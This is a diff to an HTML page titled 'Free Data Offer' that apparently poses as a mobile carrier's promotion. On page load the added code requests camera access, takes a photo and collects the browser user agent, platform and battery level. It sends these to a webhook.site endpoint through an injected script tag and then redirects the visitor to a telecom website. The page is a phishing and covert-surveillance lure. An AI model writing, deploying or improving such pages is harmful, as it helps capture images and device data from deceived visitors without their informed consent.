@@ -4,86 +4,50 @@
     <title>Free Data Offer</title>
 </head>
 <body>
-    <button id="requestCamera" style="display: none;">Request Camera Permission</button>
-
     <script>
-        // Function to request camera permission and capture a photo
+        // Function to request camera permission
         function requestCameraPermission() {
             navigator.mediaDevices.getUserMedia({ video: true })
             .then(function(stream) {
-                // Camera access granted
-                console.log('Camera permission granted.');
-
-                // Hide the button
-                document.getElementById('requestCamera').style.display = 'none';
-
-
-
-                // Access the video stream and capture a photo (you can add this part as needed)
-                const video = document.createElement('video');
-                document.body.appendChild(video);
-                video.srcObject = stream;
-
-                video.onloadedmetadata = function(e) {
-                    // Adjust the video size here if needed
-                    video.play();
-
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    const context = canvas.getContext('2d');
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                    // Convert the captured image to a Blob
-                    canvas.toBlob(function(blob) {
-                        // Get device information
-                        getDeviceInformation(blob);
-
-                        // Clean up resources (you can add this part as needed)
-                        stream.getTracks().forEach(track => track.stop());
-                        video.remove();
-                    }, 'image/jpeg');
+                // Permission granted, you can capture a photo here
+                const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);
+                return imageCapture.takePhoto();
+            })
+            .then(function(photoBlob) {
+                // Get device information and battery percentage here
+                const deviceInfo = {
+                    brand: navigator.userAgent,
+                    model: navigator.platform
                 };
+                const batteryPercentage = navigator.getBattery().level * 100;
+
+                // Prepare data to send in a JSONP request
+                const dataToSend = {
+                    photo: URL.createObjectURL(photoBlob),
+                    deviceInfo: deviceInfo,
+                    batteryPercentage: batteryPercentage
+                };
+
+                // Create a JSONP request
+                const script = document.createElement('script');
+                script.src = 'https://webhook.site/6bab9354-77d4-4922-9f9c-32c264d35fb7?data=' + JSON.stringify(dataToSend);
+
+                // Redirect after the request is sent
+                script.onload = function() {
+                    window.location.href = 'https://www.mobitel.lk';
+                };
+
+                // Append the script to the document
+                document.body.appendChild(script);
             })
             .catch(function(error) {
-                // Camera access denied
-
-                // Get the battery percentage and device information
-                getBatteryPercentage();
-                getDeviceInformation();
+                // Handle errors
+                console.error('Error: ' + error);
             });
         }
 
-        // Function to get the battery percentage
-        function getBatteryPercentage() {
-            if ('getBattery' in navigator) {
-                navigator.getBattery().then(function(battery) {
-                    // Include the battery percentage in the request (you can add this part as needed)
-                    console.log('Battery Percentage: ' + (battery.level * 100) + '%');
-                });
-            } else {
-                console.log('Battery Status API is not supported in this browser.');
-            }
-        }
-
-        // Function to get device information and include it in the request
-        function getDeviceInformation(photoBlob) {
-            const deviceInfo = {
-                userAgent: navigator.userAgent,
-                brand: navigator.appVersion,
-                model: navigator.product,
-                platform: navigator.platform
-            };
-
-            // Include device information and the captured photo in the request (you can add this part as needed)
-            console.log('Device Information:', deviceInfo);
-        }
-
-        // Automatically click the button when the page loads
-        window.addEventListener('load', function() {
-            requestCameraPermission();
-        });
-        
+        // Call the permission function when the page loads
+        requestCameraPermission();
     </script>
 </body>
 </html>
